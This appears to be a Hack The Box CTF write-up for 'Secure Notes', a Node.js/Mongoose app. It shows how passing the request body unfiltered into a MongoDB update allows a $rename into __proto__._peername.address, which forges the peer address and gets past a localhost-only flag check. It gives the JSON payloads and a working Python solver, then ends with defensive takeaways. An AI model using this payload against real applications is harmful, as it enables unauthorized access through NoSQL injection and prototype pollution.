---
layout: post
title: "Hack The Box - Secure Notes"
description: "Abusing an unfiltered Mongoose update to inject a MongoDB $rename operator, pollute Node's socket peer address, and bypass a localhost-only flag route."
date: 2026-06-07 10:00:43 +0700
categories: [writeup, ctf]
tags: [web, hackthebox, nodejs, express, mongoose, mongodb, nosql-injection, prototype-pollution]
ctf: "Hack The Box"
challenge: "Secure Notes"
category: "Web"
difficulty: "Medium"
points: 0
author: "gr3yr4t"
toc: true
comments: true
image: /assets/img/featured/secure-notes.svg
featured: true
---

## Challenge Description

Secure Notes is a small Node.js note-taking application. From the player perspective, the app lets us create notes, view them, and update their title and content through a simple web UI.

The challenge bundle contains an Express application backed by MongoDB through Mongoose. The important files are `app.js`, which defines the API routes, `package.json`, which shows the Express and Mongoose dependencies, and the Docker configuration that runs both the app and `mongod` under supervisor.

There is also a top-level `exploit.py`, which is the useful solver for the challenge. A second solver exists under `web_secure_notes/exploit.py`, but it appears to be a partial or stale attempt and does not retrieve the flag.

## TL;DR

1. `/flag` only returns the flag when `req.connection.remoteAddress` is localhost.
2. `/create` lets us create a note with attacker-controlled `title` and `content`.
3. `/update` passes the full request body directly into `Note.findByIdAndUpdate()`.
4. Because update operators are not filtered, we can send a raw MongoDB `$rename`.
5. `$rename` moves `title` into `__proto__._peername.address`, causing prototype pollution.
6. After pollution, `/flag` reads the forged peer address and returns the flag.

## Initial Analysis

The backend is very small. It connects to MongoDB, defines a `Note` model, serves static files, and exposes four routes:

```js
app.get('/flag', ...);
app.post('/create', ...);
app.get('/get/:noteId', ...);
app.post('/update', ...);
```

The note schema only contains two fields:

```js
const Note = mongoose.model('Note', new mongoose.Schema({
    title: String,
    content: String,
}));
```

The flag route immediately stands out because it uses the request's socket address as an authorization boundary. Remote users should receive `403`, while local requests receive the flag.

There is no SSRF primitive in the application, so the interesting question becomes: can we influence what Express or Node thinks the client address is?

## Reading The Source

The flag route checks `req.connection.remoteAddress`:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{redacted}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

The create route is mostly normal. It validates that both fields are strings, then stores the note:

```js
app.post('/create', async (req, res) => {
    const { title, content } = req.body;
    if (typeof title !== 'string' || typeof content !== 'string') {
        res.status(400).json({ Message: 'Invalid title or content' });
        return;
    }

    const note = new Note({
        title,
        content,
    });

    await note.save();
    res.json(note);
});
```

The vulnerable route is `/update`:

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

The application expects the body to look like this:

```json
{
  "noteId": "...",
  "title": "new title",
  "content": "new content"
}
```

But it never enforces that shape. Whatever JSON keys we send are handed directly to Mongoose as the update document.

## Vulnerability Analysis

The core bug is trusting the client-controlled update body.

The application assumes that users will only send ordinary fields such as `title` and `content`. That assumption is wrong because MongoDB update documents can contain operators like `$set`, `$unset`, and `$rename`.

The vulnerable data flow is:

```text
HTTP JSON body
  -> express.json()
  -> req.body
  -> Note.findByIdAndUpdate(noteId, req.body)
  -> MongoDB/Mongoose update operation
```

Because `req.body` is used directly as the update object, an attacker can inject a MongoDB operator. The solver uses `$rename`:

```json
{
  "noteId": "...",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

Before sending this update, the attacker creates a note with this title:

```text
127.0.0.1
```

The `$rename` operation then moves that value into the dangerous path:

```text
__proto__._peername.address = "127.0.0.1"
```

In this Node.js environment, `req.connection.remoteAddress` depends on the socket peer-name information. By polluting `_peername.address`, the later `/flag` request sees a forged localhost address and passes the authorization check.

The bypass is not about reaching the server from localhost. It is about corrupting the object state used by the localhost check.

## First Attempts

The obvious first request is to hit `/flag` directly:

```http
GET /flag
```

That fails with `403` because the remote address is not one of the accepted loopback values.

A normal note update also does not help:

```json
{
  "noteId": "...",
  "title": "127.0.0.1",
  "content": "pwned"
}
```

That only changes stored note fields. The server-side `remoteAddress` value is still controlled by Node's socket internals, not by the note content.

The important realization is that `/update` is not limited to normal fields. Once raw MongoDB operators are allowed, the note update route becomes a way to reach dangerous object paths.

## Exploitation

The final exploit has three requests.

First, create a note whose `title` contains the address we want `/flag` to see:

```json
{
  "title": "127.0.0.1",
  "content": "pwned"
}
```

The server returns the created note, including its `_id`.

Next, update that note using a raw `$rename` operator:

```json
{
  "noteId": "<note id>",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

This poisons the peer-name address used later by the socket address lookup.

Finally, request the protected route:

```http
GET /flag
```

After the pollution step, the localhost check succeeds and the app returns the flag.

## Exploit Flow Summary

```text
create note with title = 127.0.0.1
  -> send unfiltered $rename through /update
  -> rename title into __proto__._peername.address
  -> req.connection.remoteAddress resolves to polluted value
  -> /flag localhost check passes
  -> final flag
```

## Solver

A cleaned-up version of the working solver is:

```python
#!/usr/bin/env python3
import sys
import requests

target = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:1337"

# Store the value that we want Node to later read as the socket peer address.
note = requests.post(f"{target}/create", json={
    "title": "127.0.0.1",
    "content": "pwned"
}).json()

note_id = note["_id"]

# Inject a raw MongoDB update operator.
# The title value is renamed into a prototype path used by Node's peer-name lookup.
requests.post(f"{target}/update", json={
    "noteId": note_id,
    "$rename": {
        "title": "__proto__._peername.address"
    }
})

print(requests.get(f"{target}/flag").text)
```

Run it like this:

```bash
python3 exploit.py http://127.0.0.1:1337
```

For a remote HTB instance, replace the URL with the provided host and port.

## Flag

```text
HTB{redacted}
```

## Why This Bug Matters

This challenge is a good example of why database update APIs should not receive client JSON directly.

With Mongoose and MongoDB, an update object is not just data. It can also be an instruction document containing operators. If the application does not explicitly select allowed fields, user input can become database logic.

The localhost check is also fragile. Authorization based on `remoteAddress` assumes the runtime state is trustworthy. Once prototype pollution enters the picture, even internal-looking properties can become attacker-influenced.

## Takeaways

- Never pass an entire request body directly into a MongoDB update call.
- Allowlist updateable fields such as `title` and `content`.
- Reject keys starting with `$` in user-controlled objects unless they are explicitly needed.
- Treat paths containing `__proto__`, `constructor`, or `prototype` as dangerous.
- Localhost-only checks are not a substitute for real authorization.
- Prototype pollution can turn small data bugs into control over framework or runtime behavior.
